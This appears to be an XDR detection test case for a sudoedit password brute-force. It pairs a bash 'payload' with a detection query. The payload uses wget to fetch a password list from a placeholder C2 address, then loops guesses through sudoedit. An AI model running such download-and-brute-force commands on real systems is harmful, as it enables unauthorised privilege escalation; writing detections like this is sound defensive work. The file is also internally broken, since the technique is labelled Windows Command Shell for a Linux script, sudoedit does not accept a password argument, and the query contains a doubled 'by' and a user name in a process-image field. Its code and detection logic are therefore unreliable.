identity.name: Sudoedit Brute Force Attack via Automated Script
identity.summary: An attacker attempts to brute-force a sudoedit command using a script that iterates through potential passwords. Cortex detects this behavior via process start telemetry and network activity.
identity.description: An attacker attempts to brute-force a sudoedit command using a script that iterates through potential passwords. Cortex detects this behavior via process start telemetry and network activity.

techniques.name: Command and Scripting Interpreter: Windows Command Shell

payload.code:
mkdir -p /tmp/brute_force
wget -O /tmp/brute_force/pwdlist.txt http://192.0.2.5/pwdlist.txt
chmod 644 /tmp/brute_force/pwdlist.txt
for pwd in $(cat /tmp/brute_force/pwdlist.txt); do
  echo "Trying password: $pwd"
  sudoedit -s "${pwd}" 2>&1 | grep -q "incorrect" || break
done

expected_artifacts.description: Process starting sudoedit with incorrect password
Password list file downloaded from C2

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Sudoedit Brute Force Attempt
biocs.description: Detects repeated sudoedit process starts with invalid passwords
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'sudoedit'
| filter actor_process_image_name = 'bash'
| filter causality_actor_process_image_name = 'www-data'
| comp count() as cnt by by action_process_image_name
